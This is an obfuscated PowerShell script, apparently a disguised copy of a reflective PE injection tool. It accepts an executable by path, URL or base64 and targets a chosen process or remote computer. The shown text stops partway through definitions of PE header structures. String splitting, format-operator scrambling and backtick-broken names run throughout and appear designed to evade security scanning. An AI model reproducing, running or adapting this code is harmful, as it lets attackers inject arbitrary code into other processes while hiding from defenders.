$60uA  =  [TYpE]("{6}{10}{5}{9}{0}{1}{4}{8}{7}{2}{3}" -F 'm','e.I','ViceS.mARsHALASAT','TRiBUTe','NT','tem.r','sY','ser','EROP','unTi','s')  ; $dt43mq=  [TypE]("{4}{7}{3}{11}{9}{5}{2}{1}{0}{10}{8}{6}{12}" -f 'ter','.In','e','m','s','m','eD','YSTE','mAnAg','I','opsERVicEs.Un','.RUNT','tYPe') ; set-iTEm  vARiaBLe:tdpz ( [tYPE]("{1}{0}"-f '2','iNt3')  ); $5Z2Q  =[typE]("{1}{0}" -f 'L','bOo')  ;SEt esQBm  (  [Type]("{1}{0}" -F '32','uInT')  )  ;    SEt-item ('Var'+'ia'+'bLE'+':0YNV'+'gA')  ([type]("{1}{0}{2}"-f 'tcoN','BI','VeRteR'));seT-iTEM ("vAriaBle:pI"+"C0m"+"a") ( [type]("{9}{4}{3}{11}{5}{7}{1}{0}{2}{6}{8}{12}{10}" -F '.','It','AssEmbLYBuil','rE','TeM.','ec','derA','tIoN.EM','C','sYs','eSs','fL','C') );  Sv ("b"+"N0")  ( [tYPe]("{4}{1}{5}{3}{7}{6}{0}{9}{8}{10}{2}"-f 'li','Em','S','on.','sYsT','.ReflEcti','l','Ca','oNVeNTio','NGc','N') )  ; sv  xO9riG ([TyPe]("{0}{1}" -F'A','PpDomAiN')  ) ; $nQZ =  [tYPe]("{3}{2}{0}{1}"-F 'roNmEN','T','nVI','E') ;  Set-itEm  ('VA'+'ri'+'abLE:CR98P') ( [TypE]("{1}{0}" -F 'TpTr','UiN') )  ; $r72g  =  [tYpe]("{0}{1}" -f'mA','tH') ;  SET  ZNdo  ( [tYPe]("{10}{11}{0}{8}{4}{6}{1}{3}{9}{7}{5}{2}"-f 'RuNTI','rop','haL','SE','i','ARs','nTe','.M','ME.','rviCES','SYsT','Em.') ) ;$pEFZ6j  =  [TYPe]("{0}{1}" -f'int','PTr') ;  $39R8H =[tyPe]("{0}{1}{2}{3}" -f 's','Yst','Em.IO.','FIle')  ;  sv mF341  ( [TyPe]("{1}{0}"-f'nvERT','Co'))  ; function inVOke`-rEflE`C`TI`VEPeI`Nje`cTi`oN
{


[CmdletBinding(dEFAUlTpAramEtERSeTname={"{0}{1}" -f'WebFil','e'})]
Param(
    [Parameter(paramETerSetnaMe = "Lo`cALf`Ile", POsItIOn = 0, mandATory = ${T`RuE})]
    [String]
    ${p`EPa`TH},
    
    [Parameter(PARametersetName = "W`Ebf`iLE", POSiTion = 0, MAnDATory = ${T`RUe})]
    [Uri]
    ${PE`UrL},

    [Parameter(pAraMETerSetnaME = "By`TeS", pOsITION = 0, MandatOrY = ${TR`Ue})]
    [ValidateNotNullOrEmpty()]
    [String]
    ${p`E`BAse64},
    
    [Parameter(PosiTIon = 1)]
    [String[]]
    ${C`OMp`U`Ter`NAmE},
    
    [Parameter(poSITIOn = 2)]
    [ValidateSet( {"{0}{1}" -f'WS','tring'}, {"{1}{0}"-f'ng','Stri'}, {"{1}{0}" -f 'oid','V'} )]
    [String]
    ${f`U`NcReTURNTy`pE} = ("{1}{0}"-f'd','Voi'),
    
    [Parameter(pOSiTion = 3)]
    [String]
    ${EX`ea`RGs},
    
    [Parameter(PosITIon = 4)]
    [Int32]
    ${prOc`ID},
    
    [Parameter(positIoN = 5)]
    [String]
    ${P`ROC`NamE},

    [Parameter(PosITiOn = 6)]
    [Switch]
    ${fORC`E`A`SLr}
)

&("{1}{0}{3}{2}"-f 'et-S','S','ictMode','tr') -Version 2


${REmo`Te`sCRip`TbL`o`CK} = {
    [CmdletBinding()]
    Param(
        [Parameter(PoSITIoN = 0, mAndAToRY = ${tR`UE})]
        [Byte[]]
        ${Peby`T`es},
        
        [Parameter(PoSItIoN = 1, MaNDaTory = ${tr`Ue})]
        [String]
        ${FUNcre`Tu`Rn`TyPe},
                
        [Parameter(POsItIOn = 2, manDAtOry = ${TR`Ue})]
        [Int32]
        ${PRo`CId},
        
        [Parameter(POSITiON = 3, MaNDATorY = ${t`RUE})]
        [String]
        ${pr`OC`N`AmE},

        [Parameter(pOsitIoN = 4, mANdAtoRY = ${tr`Ue})]
        [Bool]
        ${FO`RCeas`lR}
    )
    
    
    
    
    Function g`eT-W`In32ty`pes
    {
        ${W`iN32`TY`pES} = &("{1}{2}{0}{3}"-f'-Obj','Ne','w','ect') ("{0}{3}{2}{1}"-f 'S','Object','.','ystem')

        
        
        ${dOMa`iN} =  ( variablE  ('xo9r'+'Ig') -vaLueONlY )::"C`UrrEN`TdOMA`iN"
        ${dyNA`mIcAs`sEm`B`LY} = &("{2}{0}{1}"-f'ec','t','New-Obj') ("{5}{0}{3}{6}{8}{4}{7}{1}{2}" -f 'y','ly','Name','stem','ection.A','S','.Ref','ssemb','l')(("{4}{2}{3}{1}{0}" -f 'y','bl','micAsse','m','Dyna'))
        ${AsSembL`yBU`i`l`der} = ${D`o`mAIn}."DeF`InEDynA`M`i`cAssEMB`lY"(${d`yNaMIca`s`seMBly},   (  ChilDitem vARIablE:pic0MA ).ValUE::"r`UN")
        ${moDulEBU`i`Ld`Er} = ${Ass`EmblyBUi`l`d`er}.("{4}{0}{1}{2}{3}{5}"-f 'efine','Dy','namicMo','dul','D','e').Invoke(("{0}{2}{3}{1}" -f 'Dyna','odule','mic','M'), ${f`AL`Se})
        ${c`o`NsTRuC`ToR`INFo} =  $60uA.("{0}{1}{2}{3}" -f'Get','Const','ruc','tors').Invoke()[0]


        
        
        ${Ty`pEb`Ui`LDeR} = ${mo`duleBu`IL`D`eR}.("{0}{1}{2}" -f 'De','f','ineEnum').Invoke(("{2}{1}{3}{0}"-f'ype','achi','M','neT'), ("{0}{1}"-f'Publi','c'), [UInt16])
        ${t`yPeBui`LDEr}.("{0}{2}{1}" -f 'De','neLiteral','fi').Invoke(("{0}{1}" -f'N','ative'), [UInt16] 0) | &("{0}{1}{2}" -f 'Out','-Nul','l')
        ${tYP`E`Bu`IlDeR}.("{3}{4}{0}{2}{1}" -f 'fin','iteral','eL','D','e').Invoke(("{0}{1}" -f 'I38','6'), [UInt16] 0x014c) | &("{2}{0}{1}"-f '-Nu','ll','Out')
        ${T`ypEB`UI`ldEr}.("{1}{2}{0}" -f 'ral','Defin','eLite').Invoke(("{0}{1}" -f 'I','tanium'), [UInt16] 0x0200) | &("{0}{1}{2}" -f 'Out','-Nul','l')
        ${t`yPEbU`ildeR}."DeF`INe`lIt`ER`Al"('x64', [UInt16] 0x8664) | &("{2}{0}{1}"-f '-Nu','ll','Out')
        ${mACH`iNeTY`PE} = ${tYp`EBuIl`deR}.("{2}{1}{0}" -f 'pe','teTy','Crea').Invoke()
        ${w`In32t`ypES} | &("{2}{1}{0}" -f 'ber','Mem','Add-') -MemberType ("{1}{0}{2}"-f 'er','NoteProp','ty') -Name ("{0}{1}{3}{2}" -f'M','ach','eType','in') -Value ${MAc`h`inETy`PE}

        
        ${TyP`eB`U`ILDer} = ${M`ODuL`E`BuiLdeR}.("{0}{1}{3}{2}" -f 'Defi','n','m','eEnu').Invoke(("{0}{2}{1}" -f'M','pe','agicTy'), ("{0}{1}" -f 'Publ','ic'), [UInt16])
        ${tYPeBuI`l`dER}.("{3}{0}{2}{1}"-f'ineLi','l','tera','Def').Invoke(("{3}{4}{0}{5}{6}{2}{1}"-f'AGE_N','IC','G','I','M','T_OPT','IONAL_HDR32_MA'), [UInt16] 0x10b) | &("{2}{1}{0}" -f '-Null','ut','O')
        ${t`YpeBu`IL`der}.("{2}{0}{1}" -f 'ite','ral','DefineL').Invoke(("{5}{3}{2}{1}{4}{0}" -f'GIC','H','T_OPTIONAL_','E_N','DR64_MA','IMAG'), [UInt16] 0x20b) | &("{0}{1}{2}"-f'Out-Nu','l','l')
        ${m`Agic`TYpE} = ${Type`BU`ild`ER}.("{0}{3}{1}{2}" -f'C','e','ateType','r').Invoke()
        ${wi`N`32types} | &("{2}{0}{1}"-f 'Memb','er','Add-') -MemberType ("{2}{0}{1}{3}" -f'op','e','NotePr','rty') -Name ("{1}{0}{2}"-f 'cTyp','Magi','e') -Value ${M`Ag`ICtYPE}

        
        ${T`ype`BUIl`DEr} = ${m`Od`ULebu`ilDEr}.("{1}{0}{2}"-f 'ineE','Def','num').Invoke(("{2}{1}{0}" -f'pe','SystemTy','Sub'), ("{1}{2}{0}"-f 'c','Pub','li'), [UInt16])
        ${TypE`BUIld`ER}.("{0}{2}{1}"-f'Def','teral','ineLi').Invoke(("{6}{5}{0}{3}{7}{1}{2}{4}"-f 'SYSTE','N','KN','M','OWN','GE_SUB','IMA','_U'), [UInt16] 0) | &("{2}{1}{0}"-f 'll','u','Out-N')
        ${tyPeB`U`ILd`Er}.("{1}{0}{2}"-f'efin','D','eLiteral').Invoke(("{4}{3}{1}{2}{0}"-f 'VE','TEM_NA','TI','BSYS','IMAGE_SU'), [UInt16] 1) | &("{2}{1}{0}" -f'l','l','Out-Nu')
        ${typ`EB`UILDEr}.("{2}{1}{3}{0}"-f 'al','ineL','Def','iter').Invoke(("{1}{4}{0}{5}{6}{3}{2}" -f 'E_SUBSYST','IMA','OWS_GUI','D','G','EM_','WIN'), [UInt16] 2) | &("{1}{0}{2}"-f 't-Nul','Ou','l')
        ${t`yp`EbUIl`dER}.("{1}{3}{0}{4}{2}" -f'ineLi','D','ral','ef','te').Invoke(("{2}{1}{3}{0}{4}" -f 'U','MAGE_SUBSYSTEM_WIND','I','OWS_C','I'), [UInt16] 3) | &("{0}{1}"-f'Out-Nul','l')
        ${TyPeBu`ILd`eR}.("{0}{2}{1}{3}" -f 'Defi','era','neLit','l').Invoke(("{5}{3}{2}{1}{7}{4}{6}{0}"-f 'M_POSIX_CUI','_','E','MAG','SYS','I','TE','SUB'), [UInt16] 7) | &("{1}{0}{2}"-f'ut-Nu','O','ll')
        ${TYpE`BUil`D`eR}.("{2}{0}{3}{1}"-f'eLite','al','Defin','r').Invoke(("{4}{1}{5}{0}{3}{2}"-f'INDOWS','AGE_SUBSYS','_GUI','_CE','IM','TEM_W'), [UInt16] 9) | &("{1}{0}{2}"-f 'Nul','Out-','l')
        ${tYPEB`UiL`dER}.("{0}{1}{2}" -f'DefineL','ite','ral').Invoke(("{9}{8}{2}{1}{7}{4}{3}{0}{6}{5}" -f '_','BSYST','U','EFI','_','LICATION','APP','EM','_S','IMAGE'), [UInt16] 10) | &("{0}{1}{2}"-f'Out','-Nu','ll')
        ${t`YP`EBuiLd`Er}.("{2}{0}{1}"-f 'era','l','DefineLit').Invoke(("{1}{9}{2}{0}{4}{5}{8}{3}{6}{10}{7}"-f 'BO','IMAGE_S','EM_EFI_','VI','O','T_SE','C','IVER','R','UBSYST','E_DR'), [UInt16] 11) | &("{1}{2}{0}" -f'll','Ou','t-Nu')
        ${TYP`E`BUiL`dEr}.("{0}{1}{2}{3}" -f'Defin','eLi','ter','al').Invoke(("{1}{0}{5}{3}{2}{4}"-f'SYSTEM_EFI_','IMAGE_SUB','_DRIV','E','ER','RUNTIM'), [UInt16] 12) | &("{2}{0}{1}"-f'u','ll','Out-N')
        ${typ`EbUIL`D`eR}.("{0}{2}{1}" -f 'D','ral','efineLite').Invoke(("{3}{4}{0}{2}{1}"-f 'F','_ROM','I','IMAG','E_SUBSYSTEM_E'), [UInt16] 13) | &("{0}{2}{1}"-f'O','Null','ut-')
        ${tY`p`EbUILd`Er}.("{0}{1}{2}"-f'DefineLite','ra','l').Invoke(("{1}{5}{0}{3}{2}{4}" -f'UB','IM','M','SYSTE','_XBOX','AGE_S'), [UInt16] 14) | &("{0}{1}"-f 'Out','-Null')
        ${Su`B`SysTe`m`TYPE} = ${tYPe`Bu`ILder}.("{0}{1}{3}{2}"-f 'C','reat','ype','eT').Invoke()
        ${wIN32`TYp`Es} | &("{1}{0}{2}"-f'M','Add-','ember') -MemberType ("{1}{0}{2}{3}"-f'te','No','P','roperty') -Name ("{3}{4}{2}{0}{1}" -f 'T','ype','tem','Su','bSys') -Value ${s`UB`sy`STEMtyPE}

        
        ${TypEB`U`iLDer} = ${moDUl`Eb`Uil`der}.("{2}{1}{0}{3}"-f'eEnu','efin','D','m').Invoke(("{0}{2}{4}{1}{3}"-f 'Dl','cteristicsTyp','lCh','e','ara'), ("{1}{0}" -f 'blic','Pu'), [UInt16])
        ${tYpEbui`lD`ER}.("{0}{2}{3}{1}" -f'D','ral','e','fineLite').Invoke(("{1}{0}"-f '_0','RES'), [UInt16] 0x0001) | &("{1}{0}{2}"-f'-','Out','Null')
        ${TyP`eb`UIlDer}.("{1}{0}{2}" -f 'efineLi','D','teral').Invoke(("{0}{1}"-f'R','ES_1'), [UInt16] 0x0002) | &("{0}{2}{1}"-f'Ou','ll','t-Nu')
        ${T`yPEBuild`ER}.("{0}{1}{3}{2}" -f 'D','efine','l','Litera').Invoke(("{1}{0}"-f'_2','RES'), [UInt16] 0x0004) | &("{0}{1}"-f 'Out-','Null')
        ${TypE`BuIL`der}.("{3}{2}{4}{0}{1}"-f 'te','ral','f','De','ineLi').Invoke(("{0}{1}"-f 'RES_','3'), [UInt16] 0x0008) | &("{0}{1}"-f 'Ou','t-Null')
        ${typ`EBuIl`Der}.("{2}{0}{1}" -f'n','eLiteral','Defi').Invoke(("{8}{5}{7}{0}{4}{1}{10}{6}{3}{2}{9}"-f 'ER','C','MIC_BA','YNA','ISTI','MAGE_DL','_D','L_CHARACT','I','SE','S'), [UInt16] 0x0040) | &("{1}{0}" -f 'll','Out-Nu')
        ${tYpE`B`UILdeR}.("{2}{0}{1}" -f'n','eLiteral','Defi').Invoke(("{5}{2}{7}{3}{10}{0}{8}{1}{4}{9}{6}"-f'S','ICS_FORCE_INTE','E_DLL_CH','ER','G','IMAG','Y','ARACT','T','RIT','I'), [UInt16] 0x0080) | &("{2}{0}{1}"-f't-Nul','l','Ou')
        ${tyPEB`UIl`d`eR}.("{1}{0}{2}" -f 'ineLiter','Def','al').Invoke(("{6}{5}{9}{1}{8}{3}{2}{4}{0}{7}"-f 'CO','_DL','NX','HARACTERISTICS_','_','M','I','MPAT','L_C','AGE'), [UInt16] 0x0100) | &("{1}{2}{0}" -f'll','Out-N','u')
        ${tYP`eB`UIL`DEr}.("{2}{1}{0}"-f'Literal','ine','Def').Invoke(("{0}{2}{4}{6}{5}{1}{3}"-f'IMAGE_DLLCHARAC','TIO','TER','N','IS','ISOLA','TICS_NO_'), [UInt16] 0x0200) | &("{0}{2}{1}" -f 'Out-Nu','l','l')
        ${TYP`EBui`lD`eR}.("{2}{1}{0}" -f 'eLiteral','fin','De').Invoke(("{1}{2}{3}{5}{4}{0}"-f '_NO_SEH','IMA','GE_DLLCH','A','ISTICS','RACTER'), [UInt16] 0x0400) | &("{0}{1}"-f 'Out-Nu','ll')
        ${TYp`E`Bu`iLder}.("{2}{3}{0}{1}"-f 'Lite','ral','De','fine').Invoke(("{0}{2}{3}{6}{4}{8}{7}{1}{5}"-f'IMAGE_DLL','BIN','CHAR','A','S','D','CTERI','CS_NO_','TI'), [UInt16] 0x0800) | &("{1}{0}{2}"-f 'u','Out-N','ll')
        ${TY`PEb`UIlDer}.("{2}{3}{0}{1}{4}"-f'Lit','e','Defin','e','ral').Invoke(("{1}{0}" -f '_4','RES'), [UInt16] 0x1000) | &("{0}{1}"-f'Out-Nul','l')
        ${t`YpE`Buil`DeR}.("{2}{1}{0}" -f'eral','it','DefineL').Invoke(("{6}{0}{1}{3}{7}{2}{5}{4}" -f 'M','AGE_DL','ACT','L','_WDM_DRIVER','ERISTICS','I','CHAR'), [UInt16] 0x2000) | &("{1}{2}{0}" -f'-Null','O','ut')
        ${t`YPEb`UIlD`Er}.("{0}{2}{1}" -f'Defi','eLiteral','n').Invoke(("{3}{0}{5}{7}{6}{2}{1}{8}{4}" -f 'GE_DLLCHARACT','MINAL_S','_TER','IMA','ARE','E','ICS','RIST','ERVER_AW'), [UInt16] 0x8000) | &("{2}{1}{0}"-f'l','t-Nul','Ou')
        ${DLLcH`A`RaC`TEristI`CsTypE} = ${t`YPE`Bui`LdeR}.("{3}{1}{0}{2}"-f'yp','ateT','e','Cre').Invoke()
        ${wI`N`32tY`pes} | &("{3}{2}{1}{0}"-f'r','e','b','Add-Mem') -MemberType ("{2}{0}{1}"-f 'r','ty','NotePrope') -Name ("{5}{1}{2}{4}{0}{3}" -f'icsT','h','a','ype','racterist','DllC') -Value ${d`LlC`haRa`C`TERIs`TiCsty`PE}

        
        
        ${A`TTRiBut`eS} = ("{10}{3}{9}{11}{1}{13}{12}{18}{16}{20}{2}{14}{17}{5}{4}{7}{0}{15}{8}{19}{6}" -f'd, ','C','l','t, ','e',' S','t','ale','oreF','An','AutoLayou','siClass, ','ass, Public','l','icit','Bef','E','Layout,',', ','ieldIni','xp')
        ${TyPeBu`Il`deR} = ${mO`duLE`B`U`IldER}.("{1}{0}{2}" -f 'f','De','ineType').Invoke(("{3}{0}{1}{2}" -f'AGE_DAT','A_DIREC','TORY','IM'), ${A`TtrI`Bu`Tes}, [System.ValueType], 8)
        (${TYPeb`Ui`lDer}.("{0}{1}{2}{3}"-f'D','efine','Fie','ld').Invoke(("{1}{2}{0}"-f'ualAddress','Vi','rt'), [UInt32], ("{1}{0}" -f'c','Publi'))).("{1}{0}{2}" -f'f','SetO','fset').Invoke(0) | &("{0}{1}" -f'Out-Nul','l')
        (${TYp`e`BU`ilder}.("{1}{2}{0}{3}"-f 'neFiel','De','fi','d').Invoke(("{1}{0}"-f 'ize','S'), [UInt32], ("{1}{0}" -f 'ic','Publ'))).("{0}{1}{2}" -f'Set','O','ffset').Invoke(4) | &("{1}{0}"-f 'l','Out-Nul')
        ${imagE_dAT`A_d`I`REC`To`RY} = ${Ty`pebuIL`d`er}.("{0}{1}{2}" -f 'Cr','eateTy','pe').Invoke()
        ${W`IN32TYp`eS} | &("{1}{2}{0}" -f 'er','Add-','Memb') -MemberType ("{0}{3}{1}{2}" -f 'N','ope','rty','otePr') -Name ("{1}{0}{3}{2}"-f 'TA','IMAGE_DA','RECTORY','_DI') -Value ${iMAg`e_dat`A_dIr`eCt`O`RY}

        
        ${a`T`TrIbuTEs} = ("{2}{11}{6}{12}{4}{14}{13}{10}{0}{1}{3}{5}{7}{8}{9}"-f 'd, B','e','AutoLayo','fo','alLayo','reField','siCla','I','n','it','le','ut, An','ss, Class, Public, Sequenti','ea','ut, S')
        ${tyPeB`U`ILD`eR} = ${m`ODu`LebUILDER}.("{1}{2}{0}"-f 'e','De','fineTyp').Invoke(("{5}{0}{3}{2}{4}{1}" -f 'AGE','ER','FILE_H','_','EAD','IM'), ${a`T`TRibU`Tes}, [System.ValueType], 20)
        ${TYP`eB`UilD`er}.("{2}{1}{0}"-f'd','eFiel','Defin').Invoke(("{0}{1}" -f'Mach','ine'), [UInt16], ("{1}{0}"-f'ic','Publ')) | &("{0}{1}"-f'Out','-Null')
        ${tY`PEBUI`ldEr}.("{1}{2}{0}"-f 'ld','Define','Fie').Invoke(("{1}{3}{2}{4}{0}"-f 'ctions','Num','S','berOf','e'), [UInt16], ("{1}{0}" -f'ic','Publ')) | &("{0}{1}{2}"-f'Out','-Nul','l')
        ${tYp`eBU`ILd`eR}.("{2}{1}{0}" -f'ld','e','DefineFi').Invoke(("{0}{2}{1}"-f 'Time','amp','DateSt'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{0}{1}{2}" -f 'Out','-N','ull')
        ${t`Y`Peb`UILDer}.("{2}{1}{0}"-f 'eld','Fi','Define').Invoke(("{4}{3}{1}{2}{5}{0}" -f 'le','y','mb','rToS','Pointe','olTab'), [UInt32], ("{0}{1}"-f'Pub','lic')) | &("{0}{1}"-f 'Out-Nu','ll')
        ${tYPE`B`U`iLDER}.("{1}{0}{3}{2}"-f'neFi','Defi','ld','e').Invoke(("{1}{0}{2}{3}"-f'umberOfSym','N','bol','s'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{0}{1}" -f 'O','ut-Null')
        ${TY`peBuI`ld`ER}.("{0}{1}{2}" -f 'Defin','eFiel','d').Invoke(("{0}{2}{4}{1}{3}{5}"-f 'S','Opti','i','onalHe','zeOf','ader'), [UInt16], ("{2}{0}{1}"-f'ubli','c','P')) | &("{0}{1}{2}"-f'Out-N','u','ll')
        ${TyP`E`BuIld`eR}.("{2}{0}{1}" -f'eFie','ld','Defin').Invoke(("{3}{4}{1}{0}{2}" -f 'ris','e','tics','Cha','ract'), [UInt16], ("{1}{0}" -f'c','Publi')) | &("{0}{1}{2}" -f 'Out','-Nul','l')
        ${IMa`ge`_fILe`_HeadEr} = ${TY`peBU`i`LdeR}.("{1}{3}{2}{0}" -f 'e','Creat','p','eTy').Invoke()
        ${WI`N`32tYpes} | &("{1}{0}{2}"-f '-Memb','Add','er') -MemberType ("{3}{1}{2}{0}" -f 'eProperty','o','t','N') -Name ("{4}{5}{3}{2}{0}{1}" -f'E_HEA','DER','L','E_FI','IMA','G') -Value ${imag`E`_`Fi`LE`_HeAder}

        
        ${AT`TrIB`U`TeS} = ("{5}{21}{3}{12}{2}{7}{15}{6}{0}{14}{9}{22}{8}{10}{16}{11}{1}{20}{4}{19}{13}{18}{17}" -f'Publi',' ','C','ut,','d','AutoL','lass, ','lass, ','plicit',' ','L','t,',' Ansi','foreField','c,','C','ayou','t','Ini',', Be','Seale','ayo','Ex')
        ${typ`e`BuIlDer} = ${mod`UL`EbUilD`eR}.("{0}{1}{2}"-f'D','efineTyp','e').Invoke(("{2}{0}{1}{3}{4}" -f'OPT','IONAL_HE','IMAGE_','ADER6','4'), ${at`TRib`UTEs}, [System.ValueType], 240)
        (${TypEB`U`I`lDER}.("{0}{2}{1}"-f'DefineF','eld','i').Invoke(("{1}{0}" -f'ic','Mag'), ${MagICt`Y`pE}, ("{2}{1}{0}"-f 'lic','ub','P'))).("{3}{1}{0}{2}" -f'tOffs','e','et','S').Invoke(0) | &("{1}{2}{0}"-f '-Null','Ou','t')
        (${TyPeb`UiL`d`eR}.("{1}{2}{0}{3}" -f 'eFi','Defi','n','eld').Invoke(("{2}{4}{3}{5}{1}{0}" -f 'Version','r','Ma','Lin','jor','ke'), [Byte], ("{1}{0}" -f 'c','Publi'))).("{0}{2}{1}" -f'Set','set','Off').Invoke(2) | &("{2}{0}{1}"-f'ut-Nu','ll','O')
        (${T`yPe`BuIldEr}.("{2}{0}{1}{3}"-f 'neF','i','Defi','eld').Invoke(("{1}{3}{2}{0}{4}" -f 'nk','M','Li','inor','erVersion'), [Byte], ("{1}{0}" -f 'c','Publi'))).("{2}{0}{1}"-f 'etOff','set','S').Invoke(3) | &("{1}{0}" -f'ull','Out-N')
        (${TyPeBu`Il`d`eR}.("{1}{2}{0}"-f 'ineField','D','ef').Invoke(("{2}{0}{1}" -f 'zeOf','Code','Si'), [UInt32], ("{1}{0}" -f 'lic','Pub'))).("{0}{2}{1}"-f'Se','set','tOff').Invoke(4) | &("{1}{2}{0}" -f 'll','Out-','Nu')
        (${t`y`pEBUilD`Er}.("{2}{1}{0}"-f'neField','fi','De').Invoke(("{4}{3}{5}{1}{2}{0}"-f'edData','ali','z','ize','S','OfIniti'), [UInt32], ("{1}{0}" -f'ic','Publ'))).("{2}{1}{0}" -f 'set','Off','Set').Invoke(8) | &("{0}{1}{2}"-f 'O','ut-Nu','ll')
        (${t`Y`pEbuilDer}.("{0}{2}{1}" -f 'D','ineField','ef').Invoke(("{3}{4}{1}{0}{2}"-f'a','i','lizedData','Siz','eOfUninit'), [UInt32], ("{1}{0}" -f 'lic','Pub'))).("{1}{0}{2}"-f 'Of','Set','fset').Invoke(12) | &("{0}{2}{1}" -f 'Out-','l','Nul')
        (${tyPe`Bu`IldEr}.("{0}{2}{1}"-f 'DefineFi','ld','e').Invoke(("{2}{0}{4}{1}{3}"-f 's','OfEntryPoi','Addre','nt','s'), [UInt32], ("{1}{0}" -f'lic','Pub'))).("{3}{2}{0}{1}" -f 'tOff','set','e','S').Invoke(16) | &("{0}{2}{1}"-f'Ou','-Null','t')
        (${TY`PEBuILd`eR}.("{0}{3}{1}{2}" -f 'De','ineF','ield','f').Invoke(("{0}{1}{3}{2}"-f'Bas','eOf','e','Cod'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).("{0}{2}{1}" -f 'Set','fset','Of').Invoke(20) | &("{1}{0}" -f'ull','Out-N')
        (${typeB`Uil`d`ER}.("{2}{1}{0}" -f'ield','F','Define').Invoke(("{1}{0}" -f'ase','ImageB'), [UInt64], ("{2}{0}{1}"-f'i','c','Publ'))).("{1}{0}{2}" -f'O','Set','ffset').Invoke(24) | &("{2}{0}{1}" -f'ut','-Null','O')
        (${ty`peBU`IL`dEr}.("{2}{1}{0}" -f 'ield','neF','Defi').Invoke(("{0}{1}{3}{2}"-f'S','e','lignment','ctionA'), [UInt32], ("{0}{1}" -f'Publ','ic'))).("{2}{3}{1}{0}" -f 'set','f','Set','Of').Invoke(32) | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
        (${tYPE`BU`ilDer}.("{3}{1}{0}{2}" -f 'l','neFie','d','Defi').Invoke(("{0}{3}{2}{1}" -f 'FileAlign','t','en','m'), [UInt32], ("{0}{1}"-f 'Publi','c'))).("{2}{1}{0}" -f't','etOffse','S').Invoke(36) | &("{0}{1}"-f 'Ou','t-Null')
        (${typEBu`iL`D`eR}.("{0}{1}{2}" -f'Defi','neFie','ld').Invoke(("{0}{2}{6}{5}{3}{7}{1}{8}{4}" -f'M','gSyste','ajo','at','sion','r','rOpe','in','mVer'), [UInt16], ("{1}{0}"-f 'ublic','P'))).("{0}{1}{2}"-f 'SetOffs','e','t').Invoke(40) | &("{0}{1}"-f 'Out-Nu','ll')
        (${tYp`e`BUIldEr}.("{0}{1}{3}{2}"-f 'Def','ine','eld','Fi').Invoke(("{1}{5}{4}{6}{3}{0}{2}"-f 'o','M','n','rsi','gSys','inorOperatin','temVe'), [UInt16], ("{1}{0}"-f'lic','Pub'))).("{1}{3}{0}{2}"-f 'ffse','S','t','etO').Invoke(42) | &("{1}{2}{0}" -f 'Null','Out','-')
        (${T`y`peb`UIlDer}.("{3}{1}{0}{2}" -f 'el','ineFi','d','Def').Invoke(("{1}{0}{2}{3}" -f 'orI','Maj','mageVers','ion'), [UInt16], ("{1}{0}"-f'ic','Publ'))).("{2}{1}{0}"-f 'et','fs','SetOf').Invoke(44) | &("{2}{1}{0}" -f 'ull','N','Out-')
        (${tY`PeB`UilD`eR}.("{1}{3}{2}{0}"-f 'eld','Def','i','ineF').Invoke(("{2}{3}{0}{1}" -f 'eVe','rsion','Min','orImag'), [UInt16], ("{1}{0}"-f'blic','Pu'))).("{2}{1}{0}" -f't','e','SetOffs').Invoke(46) | &("{0}{1}" -f 'Out-','Null')
        (${TY`P`ebuIlD`Er}.("{2}{0}{1}" -f'efineFiel','d','D').Invoke(("{3}{4}{5}{6}{2}{1}{0}" -f'n','sio','r','Maj','orSubsys','t','emVe'), [UInt16], ("{0}{1}" -f 'Publ','ic'))).("{1}{0}{2}" -f'ffse','SetO','t').Invoke(48) | &("{0}{1}{2}"-f'Out','-N','ull')
        (${Ty`PeBuI`LDeR}.("{3}{0}{1}{2}"-f'e','Fie','ld','Defin').Invoke(("{2}{0}{1}{3}"-f 'norSubsys','temVersi','Mi','on'), [UInt16], ("{1}{0}"-f'ic','Publ'))).("{0}{1}{2}" -f 'Se','tO','ffset').Invoke(50) | &("{0}{1}{2}"-f 'Ou','t-','Null')
        (${TyPE`BUil`deR}.("{2}{1}{0}"-f 'ld','e','DefineFi').Invoke(("{5}{2}{3}{4}{1}{0}" -f'ue','nVal','32','Ver','sio','Win'), [UInt32], ("{0}{1}{2}" -f'Pu','b','lic'))).("{2}{0}{1}"-f 'ffs','et','SetO').Invoke(52) | &("{2}{0}{1}" -f '-','Null','Out')
        (${Typ`eBUIl`deR}.("{1}{3}{2}{0}" -f 'd','Define','iel','F').Invoke(("{2}{0}{1}"-f 'izeOfImag','e','S'), [UInt32], ("{1}{0}"-f'c','Publi'))).("{0}{1}" -f 'SetO','ffset').Invoke(56) | &("{0}{1}{2}" -f'Out-N','ul','l')
        (${TyPeBUIL`d`ER}.("{2}{1}{0}" -f'ield','F','Define').Invoke(("{4}{3}{1}{0}{2}"-f 'r','Heade','s','Of','Size'), [UInt32], ("{2}{0}{1}" -f 'u','blic','P'))).("{0}{1}{2}"-f'S','etOff','set').Invoke(60) | &("{1}{0}{2}"-f't-Nul','Ou','l')
        (${TypEb`Ui`l`DER}.("{0}{2}{1}"-f 'D','ld','efineFie').Invoke(("{0}{1}{2}" -f 'C','heckSu','m'), [UInt32], ("{0}{2}{1}" -f 'Pub','ic','l'))).("{2}{0}{1}" -f 'fse','t','SetOf').Invoke(64) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
        (${tYPeb`UI`ldER}.("{1}{0}{2}{3}" -f'ne','Defi','Fiel','d').Invoke(("{1}{3}{0}{2}"-f 'te','S','m','ubsys'), ${SUBs`Y`S`TeMtYpE}, ("{0}{1}"-f'P','ublic'))).("{1}{0}{2}" -f 'e','S','tOffset').Invoke(68) | &("{2}{1}{0}" -f'l','t-Nul','Ou')
        (${tyP`eBU`IlDEr}.("{1}{2}{0}"-f 'd','DefineFi','el').Invoke(("{3}{2}{1}{0}"-f 'ics','lCharacterist','l','D'), ${DLlCHA`RACTE`Ri`ST`IC`sTYPe}, ("{0}{1}"-f'Publ','ic'))).("{1}{3}{0}{2}"-f 'O','Se','ffset','t').Invoke(70) | &("{1}{0}"-f'll','Out-Nu')
